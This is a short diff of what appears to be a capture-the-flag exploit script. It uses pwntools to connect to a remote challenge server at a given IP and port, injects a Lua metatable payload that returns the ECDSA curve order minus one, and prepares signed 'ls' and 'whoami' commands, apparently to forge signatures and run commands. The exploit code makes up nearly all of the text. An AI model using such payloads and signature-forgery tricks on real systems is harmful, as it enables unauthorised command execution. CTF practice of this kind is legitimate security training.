@@ -150,7 +150,7 @@ from pwn import *
 from Crypto.Util.number import inverse
 
 conn = remote("52.236.0.242", 1337)
-#conn = process("./task.py")
+#conn = process("./Lubear_Revenge.py")
 for _ in range(13):
     conn.recvline()
 
@@ -160,7 +160,7 @@ vk = sk.get_verifying_key()
 veri_key = vk.from_pem(pem)
 n = veri_key.pubkey.order
 
-payload = "{ __call = function(table, key) local m = { name = key }; return '"+str(n-1)+"'; end }"
+payload = "{ __call = function(n) return '"+str(n-1)+"'; end }"
 cmd = ["ls","whoami"]
 sig = []
 for i in range(2):
